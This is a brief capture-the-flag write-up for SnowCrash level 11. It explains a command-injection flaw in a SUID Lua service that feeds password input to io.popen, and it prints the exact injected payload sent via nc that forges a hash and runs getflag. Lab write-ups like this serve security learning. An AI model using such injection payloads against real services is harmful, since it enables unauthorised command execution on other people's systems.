# Level11 – SnowCrash

## Objective
Exploit a vulnerable Lua service to retrieve the flag.

## Reconnaissance
`level11.lua` runs as SUID and listens on `127.0.0.1:5151`.
User input is passed directly to a shell command via `io.popen`, leading to command injection.

## Exploitation
Injected payload to forge the expected SHA1 and execute `getflag`:
```bash
nc 127.0.0.1 5151
Password: -n ""; echo -n "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0"; getflag > /tmp/pass.txt #
```

## Flag
![Level11 Flag Screenshot](images/level11_flag.png)

